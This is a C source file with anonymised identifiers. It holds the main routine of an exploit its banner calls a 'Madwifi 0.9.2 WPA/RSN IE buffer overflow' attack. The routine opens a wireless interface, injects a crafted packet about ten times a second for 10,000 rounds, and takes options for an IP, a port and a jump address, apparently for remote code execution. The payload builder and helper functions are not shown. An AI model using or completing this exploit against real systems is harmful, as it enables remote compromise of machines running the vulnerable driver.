
typedef unsigned long size_t;
typedef long intptr_t; typedef unsigned long uintptr_t;
typedef long scalar_t__;

typedef int bool;






struct tx80211_packet {unsigned char* packet; int plen; } ;
struct tx80211 {char* ifname; } ;


 int VAR_0 ;
 int VAR_1 ;
 int VAR_2 ;
 int VAR_3 ;
 unsigned char* FUNC_0 () ;
 char* VAR_4 ;
 int FUNC_1 (int) ;
 int FUNC_2 (int ,char*,...) ;
 char* VAR_5 ;
 char* VAR_6 ;
 int VAR_7 ;
 int VAR_8 ;
 int FUNC_3 (int,char**) ;
 int FUNC_4 (char*) ;
 int VAR_9 ;
 int FUNC_5 (unsigned char*,int ) ;
 int FUNC_6 (char*,...) ;
 int VAR_10 ;
 int FUNC_7 (struct tx80211*) ;
 int FUNC_8 (struct tx80211*) ;
 scalar_t__ FUNC_9 (struct tx80211*,char*,int) ;
 scalar_t__ FUNC_10 (struct tx80211*) ;
 int FUNC_11 (char*) ;
 scalar_t__ FUNC_12 (struct tx80211*,int ) ;
 scalar_t__ FUNC_13 (struct tx80211*,struct tx80211_packet*) ;
 int FUNC_14 (char*) ;
 int FUNC_15 (int) ;

int FUNC_16(int VAR_11, char *VAR_12[])
{
  int VAR_13=0;
  struct tx80211 VAR_14;
  struct tx80211_packet VAR_15;
  int VAR_16;

  FUNC_3(VAR_11, VAR_12);

  if(!VAR_5 || !VAR_4 || !VAR_6 || !VAR_9)
  {
    FUNC_14(VAR_12[0]);
    FUNC_1(1);
  }

  FUNC_6( "\n\nMadwifi 0.9.2 WPA/RSN IE buffer overflow\n\t exploit code: sgrakkyu <at> antifork.org\n"
          "-------------------- **** ------------------\n"
          "[opt-ip]: %s\n[opt-port]: %d\n[opt-iface]: %s\n[opt-driver]: %s\n[opt-jump]: 0x%08x\n[pad]: %d\n"
          "-------------------- **** ------------------\n\n",
          VAR_6, VAR_9, VAR_5, VAR_4, VAR_7, VAR_8);

  unsigned char *VAR_17 = FUNC_0();
  FUNC_5(VAR_17, VAR_2);


  VAR_16 = FUNC_11(VAR_4);


  if (VAR_16 == VAR_1)
  {
    FUNC_2(VAR_10, "Driver name not recognized.\n");
    return -1;
  }

  if (FUNC_9(&VAR_14, VAR_5, VAR_16) < 0) {
    FUNC_2(VAR_10, "Error initializing drive \"%s\".\n", VAR_12[1]);
    return -1;
  }

  if ((FUNC_8(&VAR_14) & VAR_3) == 0)
  {
    FUNC_2(VAR_10, "Driver does not support transmitting control frames.\n");
    return -1;
  }

  if (FUNC_12(&VAR_14, VAR_0) < 0)
  {
    FUNC_2(VAR_10, "Error setting channel.\n");
    return 1;
  }

  if (FUNC_10(&VAR_14) < 0)
  {
    FUNC_2(VAR_10, "Unable to open interface %s.\n", VAR_14.ifname);
    return 1;
  }


  VAR_15.packet = VAR_17;
  VAR_15.plen = VAR_2;

  FUNC_6("[sending packets]: about 10 a second\n");

  while(VAR_13 < 10000)
  {

    if (FUNC_13(&VAR_14, &VAR_15) < 0)
    {
      FUNC_2(VAR_10, "Unable to transmit packet.\n");
      FUNC_4("txpacket");
      return 1;
    }
    VAR_13++;
    FUNC_15(100000);
  }

  FUNC_7(&VAR_14);

  return 0;
}
